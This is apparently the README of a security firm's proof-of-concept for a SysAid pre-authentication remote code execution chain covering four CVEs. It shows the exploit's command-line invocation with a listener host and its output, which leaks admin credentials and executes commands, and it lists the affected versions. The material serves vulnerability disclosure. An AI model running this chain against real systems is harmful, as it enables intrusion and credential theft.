# SysAid PreAuth RCE Chain PoC

PoC for SysAid PreAuth RCE Chain (CVE-2025-2775, CVE-2025-2776, CVE-2025-2777, CVE-2025-2778)
 
 See our [blog post](https://labs.watchtowr.com/) for technical details
 


# PoC in Action


```

python watchTowr-vs-SysAid-PreAuth-RCE-Chain.py -t http://192.168.201.217:8080/ -l 192.168.201.1 -c "whoami"

                         __         ___  ___________
         __  _  ______ _/  |__ ____ |  |_\__    ____\____  _  ________
         \ \/ \/ \__  \    ___/ ___\|  |  \|    | /  _ \ \/ \/ \_  __ \
          \     / / __ \|  | \  \___|   Y  |    |(  <_> \     / |  | \/
           \/\_/ (____  |__|  \___  |___|__|__  | \__  / \/\_/  |__|
                                  \/          \/     \/

        watchTowr-vs-SysAid-PreAuth-RCE-Chain.py

        (*) SysAid Pre-Auth RCE Chain

          - Sina Kheirkhah (@SinSinology) and Jake Knott of watchTowr (@watchTowrcyber)

        CVEs: [CVE-2025-2775, CVE-2025-2776, CVE-2025-2777, CVE-2025-2778]

[+] Starting HTTP server on port 80
[*] Leaking creds...
[+] Leaked credentials: admin:Aa123456
[+] Successfully logged in
[+] Extracted token
[*] Poisoning with commands
[+] Commands executed successfully
[*] Done


```

# Affected Versions

The following versions are vulnerable to this pre-auth RCE chain: `<= 23.3.40`, vendor release note can be found [here](https://documentation.sysaid.com/docs/24-40-60)



# Follow [watchTowr](https://watchTowr.com) Labs

For the latest security research follow the [watchTowr](https://watchTowr.com) Labs Team 

- https://labs.watchtowr.com/
- https://x.com/watchtowrcyber